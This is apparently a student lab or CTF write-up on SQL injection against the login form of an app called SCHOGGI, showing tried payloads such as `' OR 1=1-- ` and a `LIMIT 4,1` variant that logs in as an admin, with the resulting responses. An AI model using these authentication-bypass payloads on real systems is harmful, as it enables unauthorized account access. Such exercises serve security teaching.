# SCHOGGI: SQL Injection on Login Form

- watched Request and Response of the login page for arbitrary logins via Burp Proxy
- we assume that the login query would look something like this:

```sql
SELECT 1 FROM user WHERE username='___' AND password='___';
```

- we tried the `'OR ''=''` separately/together in the username and password field and to exploit a known vulnerability. The responses where either invalid or we got an 500 error

```sql
SELECT 1 FROM user WHERE username='' OR ''='' AND password=''OR ''='';
```

- we tried the `' OR 1=1--[SPACE]` in the username field and the login was successful. We assume because the OR clause is always TRUE and the rest of the WHERE clause is ignored because of comment, we got the first row of the query result.

```sql
SELECT 1 FROM user WHERE username='' OR 1=1--
```

```json
{ "cart": [], "role": "user", "username": "alice" }
```

- now with this knowledge we tried the LIMIT function where we tried to get a specific row. The `LIMIT 4,1` was the first time a admin was returned.

```sql
SELECT 1 FROM user WHERE username=''OR 1=1 LIMIT 4,1--[SPACE]
```

```json
{ "cart": [], "role": "admin", "username": "victor" }
```

# SCHOGGI: Union-Based SQL Injection
